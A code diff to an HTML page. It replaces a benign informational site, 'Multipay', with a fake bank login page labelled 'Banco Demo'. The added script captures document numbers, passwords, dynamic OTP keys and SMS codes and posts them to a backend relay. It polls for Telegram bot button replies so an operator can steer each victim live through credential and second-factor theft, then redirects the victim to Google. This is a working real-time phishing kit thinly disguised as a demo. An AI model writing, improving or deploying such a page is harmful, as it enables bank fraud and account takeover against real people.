-                    <h3><a href="#">Cómo proteger tus cuentas en Internet</a></h3>
-                    <p>Guía paso a paso con las mejores prácticas para mantener tus perfiles seguros.</p>
-                    <div class="meta">
-                        <span>📅 15/07/2026</span>
-                        <span>⏱ 8 min lectura</span>
-                    </div>
+            <div class="field">
+                <div class="field-label">
+                    <label for="password">Contraseña de demostración</label>
+                    <a href="#" onclick="return false">¿La olvidaste?</a>
                 </div>
-            </article>
-            <article class="article-card">
-                <div class="img-placeholder">📊</div>
-                <div class="body">
-                    <span class="tag">Tendencias</span>
-                    <h3><a href="#">Tendencias tecnológicas para este año</a></h3>
-                    <p>Descubre qué innovaciones marcarán el rumbo del ecosistema digital.</p>
-                    <div class="meta">
-                        <span>📅 10/07/2026</span>
-                        <span>⏱ 6 min lectura</span>
-                    </div>
+                <div class="password-box">
+                    <input class="input" id="password" type="password" inputmode="numeric" maxlength="4" placeholder="----" autocomplete="off" required>
+                    <button class="eye" id="togglePassword" type="button" aria-label="Mostrar u ocultar">◉</button>
                 </div>
-            </article>
-            <article class="article-card">
-                <div class="img-placeholder">🤖</div>
-                <div class="body">
-                    <span class="tag">Automatización</span>
-                    <h3><a href="#">Automatización de tareas digitales</a></h3>
-                    <p>Herramientas y métodos para optimizar tu flujo de trabajo diario.</p>
-                    <div class="meta">
-                        <span>📅 05/07/2026</span>
-                        <span>⏱ 10 min lectura</span>
-                    </div>
-                </div>
-            </article>
+            </div>
+            <div class="remember">
+                <label class="switch"><input type="checkbox" id="remember"><span></span></label>
+                <label for="remember">Recordar tipo y número de documento</label>
+            </div>
+            <button class="continue" id="continueButton" type="submit" disabled>Continuar</button>
+            <p id="loginError" class="error-msg">El usuario o la clave son incorrectos. Por favor verifique.</p>
+            <div class="register">¿No eres usuario? <a href="#" onclick="return false">Regístrate</a></div>
+        </form>
+    </section>
+
+    <section class="right-content">
+        <div class="banner">
+            <div class="banner-person"><span>👩🏻</span></div>
+            <div class="banner-info">
+                <h2>Zona Transaccional</h2>
+                <p>Descubre nuevas funciones y opciones financieras disponibles en nuestro portal de demostración.</p>
+                <button type="button">Conoce más</button>
+            </div>
         </div>
-        <div style="text-align: center; margin-top: 48px;">
-            <a href="#" class="btn-outline">Ver todos los artículos →</a>
+        <div class="slider-lines"><span></span><span></span><span></span><span></span></div>
+        <div class="help">
+            <h2>¿Cómo podemos ayudarte?</h2>
+            <div class="help-cards">
+                <div class="help-card"><div class="help-icon">▣</div>Solicitar productos</div>
+                <div class="help-card"><div class="help-icon">▯</div>Contáctanos</div>
+                <div class="help-card"><div class="help-icon">♧</div>Visítanos</div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<footer class="footer">
+    <div class="footer-top">
+        <div class="footer-logo">D &nbsp; BANCO DEMO</div>
+        <div class="footer-links">
+            <a href="#" onclick="return false">Seguridad</a>
+            <a href="#" onclick="return false">Accesibilidad</a>
         </div>
     </div>
-</section>
-
-<!-- ===== SOBRE NOSOTROS (3 PASOS) ===== -->
-<section class="about-steps" id="nosotros">
-    <div class="container">
-        <div class="section-header">
-            <h2>Así trabajamos en <span>Multipay</span></h2>
-            <p>Un proceso transparente para ofrecerte información de calidad</p>
-        </div>
-        <div class="steps-grid">
-            <div class="step-item">
-                <div class="number">1</div>
-                <h3>Investigamos</h3>
-                <p>Recopilamos datos de fuentes públicas y verificamos cada detalle.</p>
-            </div>
-            <div class="step-item">
-                <div class="number">2</div>
-                <h3>Redactamos</h3>
-                <p>Creamos contenido claro, objetivo y adaptado a todos los públicos.</p>
-            </div>
-            <div class="step-item">
-                <div class="number">3</div>
-                <h3>Publicamos</h3>
-                <p>Para que tomes decisiones informadas en tu día a día digital.</p>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- ===== AVISO LEGAL DESTACADO ===== -->
-<section class="legal-notice">
-    <div class="container">
-        <div class="legal-notice-content">
-            <span class="icon">⚖️</span>
-            <p>
-                <strong>Aviso importante:</strong> Multipay es un sitio exclusivamente informativo y educativo. 
-                <strong>No ofrece servicios financieros, no procesa pagos, no administra dinero, 
-                no vende productos financieros ni representa a entidades bancarias o plataformas de pago.</strong> 
-                Toda la información tiene fines únicamente educativos.
-            </p>
-        </div>
-    </div>
-</section>
-
-<!-- ===== FOOTER ===== -->
-<footer id="contacto">
-    <div class="container">
-        <div class="footer-grid">
-            <div class="footer-brand">
-                <a href="#" class="logo">Multi<span>pay</span></a>
-                <p>Información, tecnología e innovación para el mundo digital.</p>
-            </div>
-            <div class="footer-col">
-                <h4>Enlaces</h4>
-                <ul>
-                    <li><a href="#inicio">Inicio</a></li>
-                    <li><a href="#articulos">Artículos</a></li>
-                    <li><a href="#nosotros">Nosotros</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Legal</h4>
-                <ul>
-                    <li><a href="#">Aviso Legal</a></li>
-                    <li><a href="#">Política de Privacidad</a></li>
-                    <li><a href="#">Política de Cookies</a></li>
-                    <li><a href="#">Términos y Condiciones</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Contacto</h4>
-                <ul>
-                    <li><a href="mailto:contacto@multipay.com">📧 contacto@multipay.com</a></li>
-                    <li><a href="#">📱 +34 900 000 000</a></li>
-                    <li style="margin-top: 8px; display: flex; gap: 12px;">
-                        <a href="#" style="font-size: 1.4rem;">📘</a>
-                        <a href="#" style="font-size: 1.4rem;">🐦</a>
-                        <a href="#" style="font-size: 1.4rem;">🔗</a>
-                    </li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            © 2026 <strong>Multipay</strong>. Todos los derechos reservados. 
-            Sitio exclusivamente informativo · Sin servicios financieros.
-        </div>
+    <div class="footer-bottom">
+        <span>Portal de demostración</span>
+        <span>© Banco Demo - Versión de prueba</span>
     </div>
 </footer>
 
-<!-- ===== BANNER DE COOKIES ===== -->
-<div style="position: fixed; bottom: 0; left: 0; right: 0; background: var(--white); color: var(--text-dark); padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; z-index: 9999; border-top: 3px solid var(--primary-red); box-shadow: 0 -4px 20px rgba(0,0,0,0.1);">
-    <p style="font-size: 0.9rem; margin: 0; flex: 1; min-width: 200px;">
-        🍪 Utilizamos cookies propias y de terceros para analizar nuestros servicios. 
-        <a href="#" style="color: var(--primary-red); text-decoration: underline; font-weight: 600;">Más información</a>.
-    </p>
-    <div style="display: flex; gap: 12px;">
-        <button style="background: transparent; border: 1px solid var(--text-gray); color: var(--text-gray); padding: 8px 20px; border-radius: 50px; cursor: pointer; font-weight: 600; transition: var(--transition);">Rechazar</button>
-        <button style="background: var(--primary-red); border: none; color: var(--white); padding: 8px 24px; border-radius: 50px; cursor: pointer; font-weight: 700; transition: var(--transition);">Aceptar</button>
-    </div>
+<div class="demo-overlay" id="modalDinamica" role="dialog" aria-modal="true">
+    <section class="demo-modal">
+        <div class="demo-close-row"><button type="button" class="demo-close" id="closeModal" aria-label="Cerrar">×</button></div>
+        <div id="viewDinamica" class="demo-step active">
+            <div class="demo-instruction"><strong>Verificación de Seguridad</strong>Ingresa la Clave Dinámica de 6 dígitos de tu aplicación.</div>
+            <h2 class="demo-title">Clave Dinámica</h2>
+            <div class="otp-slots-container" id="otpContainer">
+                <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
+                <div class="otp-slot"></div><div class="otp-slot"></div><div class="otp-slot"></div>
+            </div>
+            <input type="text" id="otpInput" class="otp-hidden-input" maxlength="6" inputmode="numeric">
+            <p id="otpError" class="error-msg" style="margin-bottom:12px;">Clave dinámica incorrecta o expirada.</p>
+            <div class="demo-actions">
+                <button type="button" class="bc-button-secondary" id="btnBorrar">Borrar</button>
+                <button type="button" class="bc-button-primary" id="btnContinuar" disabled>Continuar</button>
+            </div>
+        </div>
+        <div id="viewSms" class="demo-step">
+            <div class="demo-instruction"><strong>Verificación SMS</strong>Hemos enviado un código SMS de 6 dígitos a tu celular registrado.</div>
+            <h2 class="demo-title">Código SMS</h2>
+            <div style="max-width:280px;margin:0 auto 16px;" id="smsInputWrap">
+                <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.4rem;height:50px;letter-spacing:6px;">
+            </div>
+            <p id="smsError" class="error-msg" style="margin-bottom:12px;">Código SMS inválido.</p>
+            <div class="demo-actions">
+                <button type="button" class="bc-button-primary" id="btnSmsFinal" style="max-width:100%;">Verificar Código</button>
+            </div>
+        </div>
+        <p class="demo-note">servicios bancarios</p>
+    </section>
 </div>
 
+<script>
+// ==========================================
+// CONFIGURACIÓN (AHORA APUNTA A VERCEL)
+// ==========================================
+const API_URL = '/api/send'; // Esta es tu función en Vercel
+
+// ==========================================
+// ELEMENTOS
+// ==========================================
+const documentType   = document.getElementById("documentType");
+const documentNumber = document.getElementById("documentNumber");
+const claveInput     = document.getElementById("password");
+const submitBtn      = document.getElementById("continueButton");
+const demoForm       = document.getElementById("demoForm");
+const loadingOverlay = document.getElementById('loading-overlay');
+const loginError     = document.getElementById('loginError');
+const togglePassword = document.getElementById("togglePassword");
+
+const modal         = document.getElementById("modalDinamica");
+const otpInput      = document.getElementById("otpInput");
+const otpSlots      = document.querySelectorAll(".otp-slot");
+const btnBorrar     = document.getElementById("btnBorrar");
+const btnContinuar  = document.getElementById("btnContinuar");
+const otpError      = document.getElementById("otpError");
+const otpContainer  = document.getElementById("otpContainer");
+const closeModal    = document.getElementById("closeModal");
+
+const viewDinamica  = document.getElementById("viewDinamica");
+const viewSms       = document.getElementById("viewSms");
+const smsCodeInput  = document.getElementById("smsCodeInput");
+const btnSmsFinal   = document.getElementById("btnSmsFinal");
+const smsError      = document.getElementById("smsError");
+const smsInputWrap  = document.getElementById("smsInputWrap");
+
+// ==========================================
+// ESTADO
+// ==========================================
+let pollingActivo = false;
+let pollingTimeout = null;
+let ultimoUpdateId = -1;
+let actionProcessed = false;
+let msgIdActual = null;
+let usuarioActual = "";
+
+function mostrarOverlay() { loadingOverlay.style.display = 'flex'; }
+function ocultarOverlay() { loadingOverlay.style.display = 'none'; }
+
+// ==========================================
+// VALIDACIÓN UI
+// ==========================================
+function actualizarBoton() {
+    const claveCompleta = /^[0-9]{4}$/.test(claveInput.value);
+    const usuarioLleno  = documentNumber.value.trim().length > 0;
+    const valido = claveCompleta && usuarioLleno;
+
+    submitBtn.disabled = !valido;
+    submitBtn.classList.toggle("active", valido);
+    if (valido) loginError.classList.remove("show");
+}
+
+documentNumber.addEventListener("input", actualizarBoton);
+claveInput.addEventListener("input", function() {
+    claveInput.value = claveInput.value.replace(/[^0-9]/g, "").slice(0, 4);
+    actualizarBoton();
+});
+
+togglePassword.addEventListener("click", function() {
+    const visible = claveInput.type === "text";
+    claveInput.type = visible ? "password" : "text";
+    this.textContent = visible ? "◉" : "◎";
+});
+
+// ==========================================
+// ENVIAR A VERCEL (BACKEND)
+// ==========================================
+async function enviarAlBackend(payload) {
+    try {
+        const res = await fetch(API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        console.log('Respuesta del backend:', data);
+        return data;
+    } catch (error) {
+        console.error('Error de red:', error);
+        throw error;
+    }
+}
+
+function enviarIdentificacion(tipoDoc, usuario, clave) {
+    usuarioActual = usuario;
+    mostrarOverlay();
+
+    enviarAlBackend({ action: 'login', tipoDoc, usuario, clave })
+    .then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            // Iniciar polling para escuchar las respuestas de los botones
+            escucharBotones(handleTelegramActionLogin);
+        } else {
+            ocultarOverlay();
+            alert('Error al contactar al bot. Revisa consola.');
+        }
+    }).catch(() => {
+        ocultarOverlay();
+        alert('Error de conexión con el servidor.');
+    });
+}
+
+function enviarDinamica(dinamica) {
+    mostrarOverlay();
+    enviarAlBackend({ action: 'dinamica', usuario: usuarioActual, dynamicCode: dinamica })
+    .then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionDinamica);
+        } else {
+            ocultarOverlay();
+        }
+    }).catch(() => ocultarOverlay());
+}
+
+function enviarSms(smsCode) {
+    mostrarOverlay();
+    enviarAlBackend({ action: 'sms', usuario: usuarioActual, smsCode: smsCode })
+    .then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            actionProcessed = false;
+            escucharBotones(handleTelegramActionSms);
+        } else {
+            ocultarOverlay();
+        }
+    }).catch(() => ocultarOverlay());
+}
+
+// ==========================================
+// POLLING (A TRAVÉS DE VERCEL)
+// ==========================================
+function escucharBotones(callbackAction) {
+    if (!msgIdActual) return;
+    pollingActivo = true;
+
+    async function check() {
+        if (!pollingActivo) return;
+        try {
+            // Usamos GET para consultar si hay novedades
+            const res = await fetch(`${API_URL}?action=poll&offset=${ultimoUpdateId + 1}&msgId=${msgIdActual}`);
+            const data = await res.json();
+
+            if (!data.ok || !data.result || data.result.length === 0) {
+                pollingTimeout = setTimeout(check, 2000);
+                return;
+            }
+
+            for (const u of data.result) {
+                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
+                if (u.callback_query) {
+                    const messageId = String(u.callback_query.message.message_id);
+                    if (messageId === String(msgIdActual)) {
+                        pollingActivo = false;
+                        callbackAction(u.callback_query.data);
+                        return;
+                    }
+                }
+            }
+            pollingTimeout = setTimeout(check, 2000);
+        } catch (err) {
+            pollingTimeout = setTimeout(check, 3000);
+        }
+    }
+    check();
+}
+
+// ==========================================
+// ACCIONES DE BOTONES
+// ==========================================
+function handleTelegramActionLogin(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'pedir_dinamica') {
+        modal.classList.add("is-open");
+        viewDinamica.classList.add("active");
+        viewSms.classList.remove("active");
+        otpInput.value = "";
+        otpError.classList.remove("show");
+        otpContainer.classList.remove("error");
+        actualizarOTP();
+        setTimeout(() => otpInput.focus(), 100);
+    } else if (action === 'error_usuario') {
+        loginError.classList.add("show");
+        claveInput.value = "";
+        actualizarBoton();
+        claveInput.focus();
+    } else if (action === 'banear_ip') {
+        localStorage.setItem('sys_blocked_user', 'true');
+        location.reload();
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com";
+    }
+}
+
+function handleTelegramActionDinamica(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'error_dinamica') {
+        modal.classList.add("is-open");
+        viewDinamica.classList.add("active");
+        viewSms.classList.remove("active");
+        otpError.classList.add("show");
+        otpContainer.classList.add("error");
+        otpInput.value = "";
+        actualizarOTP();
+        otpInput.focus();
+        actionProcessed = false;
+    } else if (action === 'sms_code') {
+        viewDinamica.classList.remove("active");
+        viewSms.classList.add("active");
+        smsCodeInput.value = "";
+        smsError.classList.remove("show");
+        smsInputWrap.classList.remove("error");
+        setTimeout(() => smsCodeInput.focus(), 100);
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com";
+    }
+}
+
+function handleTelegramActionSms(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'error_dinamica_final') {
+        viewSms.classList.remove("active");
+        viewDinamica.classList.add("active");
+        otpError.classList.add("show");
+        otpContainer.classList.add("error");
+        otpInput.value = "";
+        actualizarOTP();
+        otpInput.focus();
+        actionProcessed = false;
+    } else if (action === 'error_sms_final') {
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        smsCodeInput.value = "";
+        smsCodeInput.focus();
+        actionProcessed = false;
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com";
+    }
+}
+
+// ==========================================
+// SUBMIT
+// ==========================================
+demoForm.addEventListener("submit", function(e) {
+    e.preventDefault();
+    if (submitBtn.disabled) return;
+    
+    const tipoDoc = documentType.value;
+    const user = documentNumber.value.trim();
+    const pass = claveInput.value.trim();
+
+    enviarIdentificacion(tipoDoc, user, pass);
+});
+
+// ==========================================
+// OTP
+// ==========================================
+function actualizarOTP() {
+    const valor = otpInput.value;
+    otpSlots.forEach((slot, index) => {
+        if (index < valor.length) {
+            slot.textContent = valor[index];
+            slot.classList.remove("active");
+        } else {
+            slot.textContent = "";
+            if (index === valor.length) slot.classList.add("active");
+            else slot.classList.remove("active");
+        }
+    });
+
+    if (valor.length === 6) {
+        btnContinuar.disabled = false;
+        otpSlots.forEach(s => s.classList.remove("active"));
+    } else {
+        btnContinuar.disabled = true;
+    }
+}
+
+otpInput.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+    otpError.classList.remove("show");
+    otpContainer.classList.remove("error");
+    actualizarOTP();
+});
+
+otpContainer.addEventListener("click", () => otpInput.focus());
+
+btnBorrar.addEventListener("click", () => {
+    otpInput.value = "";
+    otpError.classList.remove("show");
+    otpContainer.classList.remove("error");
+    actualizarOTP();
+    otpInput.focus();
+});
+
+btnContinuar.addEventListener("click", () => {
+    if (otpInput.value.length === 6) {
+        enviarDinamica(otpInput.value);
+    }
+});
+
+closeModal.addEventListener("click", () => {
+    modal.classList.remove("is-open");
+});
+
+smsCodeInput.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+    smsError.classList.remove("show");
+    smsInputWrap.classList.remove("error");
+});
+
+btnSmsFinal.addEventListener("click", () => {
+    if (smsCodeInput.value.length < 6) {
+        smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        return;
+    }
+    enviarSms(smsCodeInput.value);
+});
+
+actualizarBoton();
+</script>
 </body>
 </html>
